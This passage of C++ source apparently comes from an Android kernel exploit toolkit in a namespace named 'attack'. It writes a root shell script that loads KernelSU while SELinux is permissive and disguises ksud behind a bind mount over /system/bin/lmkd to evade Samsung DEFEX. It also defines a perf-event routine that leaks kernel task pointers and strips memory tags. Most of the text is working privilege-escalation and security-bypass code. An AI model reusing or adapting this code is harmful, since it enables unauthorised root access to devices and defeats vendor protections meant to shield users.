             * not only in the EXIT trap. Measured 2026-10-09: the trap runs in
             * only ~12 of 182 runs -- this shell is normally killed rather than
             * exited, so a trap-only delete leaks the 2 MB dump into the run's
             * debug folder on every run. A failed fixup keeps the file, which
             * is why it is worth having next to that run's other dumps. */
            "if [ \"$FIXUP_RC\" -eq 0 ]; then rm -f \"$POLICY\"; fi\n"
            "KVER=$(uname -r | cut -d. -f1-2)\n"
            "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
            "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
            "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
            "  restore_enforce kmi-parse\n"
            "  exit 1\n"
            "fi\n"
            "KMI=\"${AVER}-${KVER}\"\n"
            "# safe mode: disable all modules before exec ksud\n"
            "if [ \"$SAFE_MODE\" = \"1\" ]; then\n"
            "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
            "  n=0\n"
            "  for m in /data/adb/modules/*/; do\n"
            "    [ -d \"$m\" ] || continue\n"
            "    if touch \"${m}disable\" 2>/dev/null; then\n"
            "      n=$((n+1))\n"
            "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
            "    fi\n"
            "  done\n"
            "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
            "fi\n"

            "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
            "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "  KSU_ALREADY=1\n"
            "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
            "else\n"
            "  KSU_ALREADY=0\n"
            "  if [ ! -x \"$KSUD\" ]; then\n"
            "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
            "    dump_debug\n"
            "    DUMP_DONE=1\n"
            "    restore_enforce ksud-missing\n"
            "    exit 1\n"
            "  fi\n"
            "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
            "  dump_debug\n"
            "  echo \"KSU-PHASE late-load-direct kmi=$KMI\"\n"
            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "  KSU_LOAD_RC=$?\n"
            "  echo \"[*] late-load exit=$KSU_LOAD_RC\" >>\"$LOG\"\n"
            /* Samsung DEFEX safeplace kills a root exec of a /data binary
             * (ksud) before it can load the module. Retry the same exec with
             * the binary bind-mounted over a whitelisted system path: DEFEX
             * sees /system/bin/lmkd, ksud runs, and the module is loaded from
             * ksud's embedded asset. The mount is detached immediately after
             * the call; lmkd never re-execs, so the window is inert. */
            "  KSU_NOW=0\n"
            "  for i in $(seq 1 20); do\n"
            "    if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_NOW=1; break; fi\n"
            "    sleep 0.1\n"
            "  done\n"
            "  if [ \"$KSU_NOW\" -ne 1 ]; then\n"
            "    echo '[*] late-load did not load; retrying via the /system/bin/lmkd bind mount' >>\"$LOG\"\n"
            "    echo 'KSU-PHASE late-load-mount'\n"
            "    umount -l /system/bin/lmkd 2>/dev/null\n"
            "    if [ -e /system/bin/lmkd ] && mount --bind \"$KSUD\" /system/bin/lmkd 2>>\"$LOG\"; then\n"
            "      /system/bin/lmkd late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "      echo \"[*] mounted late-load exit=$?\" >>\"$LOG\"\n"
            "      umount -l /system/bin/lmkd 2>/dev/null\n"
            "    else\n"
            "      echo '[!] /system/bin/lmkd bind mount unavailable' >>\"$LOG\"\n"
            "    fi\n"
            "  fi\n"
            "fi\n"
            "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
            "KSU_READY=0\n"
            "for i in $(seq 1 50); do\n"
            "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
            "  sleep 0.1\n"
            "done\n"
            "if [ \"$KSU_READY\" -eq 1 ]; then\n"
            "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
            "else\n"
            "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
            "fi\n"
            /* Dump while still permissive: after the enforcing restore the
             * toolbox domain cannot write the app's data dir, which is why the
             * previous build's dump silently vanished. The late-load path also
             * dumps before the load; a module-init re-enforce can make this
             * second dump fail, but the earlier files remain. */
            "dump_debug\n"
            "DUMP_DONE=1\n"
            "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
            "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
            "  restore_enforce already-loaded\n"
            "elif [ \"$KSU_READY\" -eq 1 ]; then\n"
            /* The module re-enforces at the end of its init; this write is a
             * no-op then, and the corrective one if it did not. */
            "  restore_enforce late-loaded\n"
            "fi\n"
            /* Unredirected so the native's script-output carries the verdict
             * even when the app's log path was not writable. The dmesg tail
             * names the DEFEX/KDP side of a failed load before the box can
             * reset (the polled drain keeps the last full snapshot). This
             * block is diagnostic only: it runs after the marker, the dump and
             * the enforcing restore, and every dmesg read is bounded, so a
             * stuck dmesg can never hold the cleanup. */
            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
            "  echo \"KSU-SUMMARY enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) kernelsu=$(grep -c '^kernelsu' /proc/modules 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) log=$LOG\"\n"
            "  timeout 2 dmesg 2>/dev/null | command grep -i -E 'defex|kdp|rkp|kernelsu' | tail -n 15\n"
            "fi\n"
            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
            "  restore_enforce ksu-not-loaded\n"
            "  exit 1\n"
            "fi\n"
            "else\n"
            "  echo '[!] fixup failed; restoring enforcing' >>\"$LOG\"\n"
            "  dump_debug\n"
            "  DUMP_DONE=1\n"
            "  restore_enforce fixup-failed\n"
            "  exit 1\n"
            "fi\n",
            (config::runtime_config_snapshot().home_dir.c_str()),
            (config::runtime_config_snapshot().ksu_log_path.c_str()),
            session::g_exploit_session.profile.safe_mode() ? 1 : 0,
            config::vr_ko_mode_name(config::runtime_config_snapshot().vrko_selinux_block),
            (config::runtime_config_snapshot().debug_dir.c_str()));
        if (n < 0 || n >= static_cast<int32_t>(script.size())) {
            pr_warning("root script too long\n");
            return;
        }
        if (write(sfd.get(), script.data(), static_cast<size_t>(n)) != n) {
            pr_warning("write root script failed errno=%d\n", errno);
        }
        sfd.reset();
        chmod((config::runtime_config_snapshot().root_script_path.c_str()), 0755);
        pr_info("root script written path=%s bytes=%d\n", (config::runtime_config_snapshot().root_script_path.c_str()),
                n);
    }

    /* Find a task through perf sample records. */
    uintptr_t perf_find_task(void) {
        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 5000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = (1ULL << 32) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;

        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0)));
        if (!fd.valid()) {
            pr_warning("perf_event_open failed errno=%d\n", errno);
            return 0;
        }
        constexpr size_t kPerfPageSize = 4096;
        constexpr size_t kPerfDataPages = 32;
        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
        const size_t msz = kPerfPageSize + kPerfDataSize;
        void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) {
            pr_warning("perf mmap failed errno=%d\n", errno);
            return 0;
        }
        /* Declaration order keeps the original release order: munmap (buf) runs
         * before close (fd) when this scope exits. */
        support::MappedRegion buf(mapped, msz);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        for (int32_t i = 0; i < 500000; i++) syscall(__NR_getpid);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
        uint64_t pos = hdr->data_tail;
        std::array<uintptr_t, 256> cands{};
        int32_t nc = 0;
        while (pos < head && nc < static_cast<int32_t>(cands.size())) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(
                base + (pos % kPerfDataSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
                p += 8; /* skip IP */
                uint64_t abi = *reinterpret_cast<uint64_t *>(p);
                p += 8;
                if (abi == 1 || abi == 2) {
                    uint64_t *regs = reinterpret_cast<uint64_t *>(p);
                    for (int32_t i = 0; i < 32 && nc < static_cast<int32_t>(cands.size()); i++) {
                        uint64_t v = regs[i];
                        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
                        v |= 0x0fULL << 56;
                        if (in_direct_map(v))
                            cands[static_cast<size_t>(nc++)] = v;
                    }
                }
            }
            pos += ev->size;
        }
        hdr->data_tail = head;
        if (!nc) return 0;
        uintptr_t best = 0;
        int32_t best_cnt = 0;
        for (int32_t i = 0; i < nc; i++) {
            const auto at = cands[static_cast<size_t>(i)];
            const int32_t cnt = static_cast<int32_t>(
                std::count(cands.begin(), cands.begin() + nc, at));
            if (cnt > best_cnt) {
                best_cnt = cnt;
                best = at;
            }
        }
        pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
        return best;
    }
} // namespace ghostlock::attack
